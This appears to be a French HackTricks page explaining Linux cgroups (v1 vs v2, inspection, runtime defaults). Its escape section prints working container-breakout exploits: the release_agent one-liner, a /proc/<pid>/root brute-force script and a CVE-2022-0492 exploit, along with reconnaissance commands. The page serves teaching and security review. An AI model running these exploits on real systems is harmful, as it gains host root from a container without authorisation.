# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Aperçu

Les **control groups** Linux sont le mécanisme du noyau utilisé pour regrouper les processus à des fins de comptabilité, de limitation, de priorisation et d'application des politiques. Si les namespaces concernent principalement l'isolation de la vue des ressources, les cgroups concernent principalement la gouvernance de **la quantité** de ces ressources qu'un ensemble de processus peut consommer et, dans certains cas, **les classes de ressources** avec lesquelles ils peuvent interagir.

Les containers s'appuient constamment sur les cgroups, même lorsque l'utilisateur ne les regarde jamais directement, car presque tous les runtimes modernes ont besoin d'un moyen pour indiquer au noyau « ces processus appartiennent à cette charge de travail, et voici les règles de ressources qui s'appliquent à eux ».

C'est pourquoi les container engines placent un nouveau container dans son propre sous-arbre cgroup. Une fois l'arbre de processus en place, le runtime peut plafonner la mémoire, limiter le nombre de PIDs, pondérer l'utilisation du CPU, réguler les I/O et restreindre l'accès aux périphériques. Dans un environnement de production, cela est essentiel à la fois pour la sécurité multi-tenant et pour une hygiène opérationnelle simple. Un container sans contrôles de ressources significatifs peut être capable d'épuiser la mémoire, inonder le système de processus ou monopoliser le CPU et les I/O de façon à rendre l'hôte ou les workloads voisins instables.

D'un point de vue sécurité, les cgroups importent de deux manières distinctes. Premièrement, des limites de ressources incorrectes ou absentes permettent des attaques par déni de service simples. Deuxièmement, certaines fonctionnalités des cgroup, en particulier dans d'anciennes configurations **cgroup v1**, ont historiquement créé des primitives de breakout puissantes lorsqu'elles étaient modifiables depuis l'intérieur d'un container.

## v1 Vs v2

Il existe deux modèles cgroup majeurs en usage. **cgroup v1** expose plusieurs hiérarchies de contrôleurs, et d'anciens rapports d'exploitation tournent souvent autour des sémantiques étranges et parfois excessivement puissantes disponibles là-bas. **cgroup v2** introduit une hiérarchie plus unifiée et un comportement généralement plus propre. Les distributions modernes préfèrent de plus en plus cgroup v2, mais des environnements mixtes ou legacy existent encore, ce qui signifie que les deux modèles restent pertinents lors de l'examen de systèmes réels.

La différence importe car certaines des histoires de breakout de container les plus célèbres, comme les abus de **`release_agent`** dans cgroup v1, sont liées très spécifiquement au comportement des anciens cgroup. Un lecteur qui voit un exploit cgroup sur un blog puis l'applique aveuglément à un système moderne uniquement cgroup v2 risque de mal comprendre ce qui est réellement possible sur la cible.

## Inspection

La façon la plus rapide de voir où se trouve votre shell actuel est :
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Le fichier `/proc/self/cgroup` affiche les chemins cgroup associés au processus courant. Sur un hôte moderne avec cgroup v2, vous verrez souvent une entrée unifiée. Sur des hôtes plus anciens ou hybrides, vous pouvez voir plusieurs chemins des contrôleurs v1. Une fois que vous connaissez le chemin, vous pouvez inspecter les fichiers correspondants sous `/sys/fs/cgroup` pour voir les limites et l'utilisation actuelle.

Sur un hôte cgroup v2, les commandes suivantes sont utiles :
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ces fichiers indiquent quels controllers existent et lesquels sont délégués aux cgroups enfants. Ce modèle de délégation importe dans les environnements rootless et systemd-managed, où le runtime peut n'être capable de contrôler que le sous-ensemble des fonctionnalités cgroup que la hiérarchie parente délègue effectivement.

## Lab

Une façon d'observer les cgroups en pratique est d'exécuter un container avec une limite mémoire :
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Vous pouvez également essayer un conteneur limité en PID :
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ces exemples sont utiles car ils aident à relier le flag du runtime à l'interface fichier du noyau. Le runtime n'applique pas la règle par magie ; il écrit les paramètres cgroup pertinents puis laisse le noyau les faire respecter sur l'arbre de processus.

## Utilisation du runtime

Docker, Podman, containerd et CRI-O reposent tous sur cgroups dans le cadre de leur fonctionnement normal. Les différences portent rarement sur l'utilisation des cgroups mais plutôt sur **les valeurs par défaut qu'ils choisissent**, **la façon dont ils interagissent avec systemd**, **le fonctionnement de la délégation en rootless**, et **la part de la configuration contrôlée au niveau du moteur versus au niveau de l'orchestration**.

Dans Kubernetes, les demandes et limites de ressources finissent par devenir une configuration cgroup sur le nœud. Le chemin du Pod YAML vers l'application par le noyau passe par le kubelet, le CRI runtime et l'OCI runtime, mais les cgroups restent le mécanisme du noyau qui applique finalement la règle. Dans les environnements Incus/LXC, les cgroups sont également largement utilisés, notamment parce que les system containers exposent souvent un arbre de processus plus riche et des attentes opérationnelles plus proches d'une VM.

## Mauvaises configurations et échappements

L'histoire classique de sécurité des cgroups est le mécanisme inscriptible **cgroup v1 `release_agent`**. Dans ce modèle, si un attaquant pouvait écrire dans les bons fichiers cgroup, activer `notify_on_release` et contrôler le chemin stocké dans `release_agent`, le noyau pourrait finir par exécuter un chemin choisi par l'attaquant dans les namespaces initiaux de l'hôte lorsque le cgroup devenait vide. C'est pourquoi les anciens writeups accordent autant d'attention à la possibilité d'écriture des contrôleurs cgroup, aux options de montage et aux conditions de namespace/capability.

Même lorsque `release_agent` n'est pas disponible, les erreurs de cgroup restent importantes. Un accès aux périphériques trop large peut rendre des périphériques de l'hôte accessibles depuis le container. L'absence de limites de mémoire et de PID peut transformer une simple exécution de code en DoS contre l'hôte. Une délégation de cgroup faible dans des scénarios rootless peut aussi induire les défenseurs en erreur en leur faisant croire qu'une restriction existe alors que le runtime n'a jamais été capable de l'appliquer.

### `release_agent` Contexte

La technique `release_agent` ne s'applique qu'à **cgroup v1**. L'idée de base est que lorsque le dernier processus d'un cgroup se termine et que `notify_on_release=1` est activé, le noyau exécute le programme dont le chemin est stocké dans `release_agent`. Cette exécution se déroule dans les **namespaces initiaux de l'hôte**, ce qui transforme un `release_agent` modifiable en primitive d'évasion de container.

Pour que la technique fonctionne, l'attaquant a généralement besoin de :

- une hiérarchie **cgroup v1** modifiable
- la capacité de créer ou d'utiliser un cgroup enfant
- la possibilité de définir `notify_on_release`
- la capacité d'écrire un chemin dans `release_agent`
- un chemin qui résout vers un exécutable du point de vue de l'hôte

### PoC classique

Le PoC historique en une ligne est :
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Cette PoC écrit un chemin de payload dans `release_agent`, déclenche la libération du cgroup, puis lit le fichier de sortie généré sur l'hôte.

### Explication lisible

La même idée est plus facile à comprendre lorsqu'elle est décomposée en étapes.

1. Créer et préparer un cgroup accessible en écriture:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifier le chemin sur l'hôte qui correspond au système de fichiers du conteneur :
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Déposer un payload qui sera visible depuis le chemin de l'hôte :
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Déclencher l'exécution en rendant le cgroup vide :
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effet est l'exécution côté hôte du payload avec les privilèges root de l'hôte. Dans un exploit réel, le payload écrit généralement un fichier de preuve, lance un reverse shell, ou modifie l'état de l'hôte.

### Variante de chemin relatif utilisant `/proc/<pid>/root`

Dans certains environnements, le chemin hôte vers le système de fichiers du conteneur n'est pas évident ou est masqué par le pilote de stockage. Dans ce cas, le chemin du payload peut être exprimé via `/proc/<pid>/root/...`, où `<pid>` est un PID de l'hôte associé à un processus dans le conteneur courant. C'est la base de la variante par force brute sur le chemin relatif :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
L'astuce pertinente ici n'est pas le brute force lui-même mais la forme du chemin : `/proc/<pid>/root/...` permet au noyau de résoudre un fichier à l'intérieur du système de fichiers du conteneur depuis le namespace hôte, même lorsque le chemin de stockage direct de l'hôte n'est pas connu à l'avance.

### CVE-2022-0492 Variante

En 2022, CVE-2022-0492 a montré que l'écriture dans `release_agent` sur cgroup v1 ne vérifiait pas correctement la présence de `CAP_SYS_ADMIN` dans le namespace utilisateur **initial**. Cela rendait la technique bien plus accessible sur les noyaux vulnérables car un processus dans un conteneur capable de monter une hiérarchie de cgroup pouvait écrire dans `release_agent` sans être déjà privilégié dans le namespace utilisateur hôte.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Sur un noyau vulnérable, l'hôte exécute `/proc/self/exe` avec les privilèges root de l'hôte.

Pour un abus pratique, commencez par vérifier si l'environnement expose encore des chemins cgroup-v1 accessibles en écriture ou un accès à des périphériques dangereux :
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` est présent et accessible en écriture, vous êtes déjà en territoire legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si le chemin cgroup lui-même ne donne pas lieu à un escape, l'usage pratique suivant est souvent denial of service ou reconnaissance :
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ces commandes indiquent rapidement si la charge de travail a la possibilité de fork-bomb, de consommer agressivement de la mémoire, ou d'abuser d'une interface cgroup héritée inscriptible.

## Vérifications

Lors de l'examen d'une cible, l'objectif des vérifications cgroup est de déterminer quel modèle de cgroup est en usage, si le conteneur a accès à des chemins de contrôleur inscriptibles, et si d'anciennes primitives de breakout telles que `release_agent` sont même pertinentes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Ce qui est intéressant ici :

- Si `mount | grep cgroup` affiche **cgroup v1**, des breakout writeups plus anciens deviennent plus pertinents.
- Si `release_agent` existe et est joignable, cela mérite immédiatement une investigation plus approfondie.
- Si la hiérarchie de cgroup visible est modifiable en écriture et que le container a également des capabilities élevées, l'environnement mérite un examen beaucoup plus approfondi.

Si vous découvrez **cgroup v1**, des mounts de contrôleurs inscriptibles, et un container qui a également des capabilities élevées ou une protection seccomp/AppArmor faible, cette combinaison mérite une attention particulière. Les cgroups sont souvent traités comme un sujet ennuyeux de gestion des ressources, mais historiquement ils ont fait partie de certaines des container escape chains les plus instructives, précisément parce que la frontière entre « contrôle des ressources » et « influence sur l'hôte » n'a pas toujours été aussi nette qu'on le supposait.

## Paramètres par défaut du runtime

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Les containers sont placés automatiquement dans des cgroups ; les limites de ressources sont optionnelles sauf si définies via des flags | omettre `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Activé par défaut | `--cgroups=enabled` est le comportement par défaut ; les valeurs par défaut du namespace cgroup varient selon la version de cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, accès aux devices assoupli, `--privileged` |
| Kubernetes | Activé via le runtime par défaut | Les Pods et containers sont placés dans des cgroups par le runtime du nœud ; le contrôle fin des ressources dépend de `resources.requests` / `resources.limits` | omettre les requests/limits de ressources, accès privilégié aux devices, mauvaise configuration du runtime au niveau hôte |
| containerd / CRI-O | Activé par défaut | les cgroups font partie de la gestion normale du cycle de vie | configurations runtime directes qui assouplissent le contrôle des devices ou exposent des interfaces héritées de cgroup v1 inscriptibles |

La distinction importante est que **existence des cgroups** est généralement activée par défaut, tandis que les **contraintes de ressources utiles** sont souvent optionnelles sauf configuration explicite.
{{#include ../../../../banners/hacktricks-training.md}}
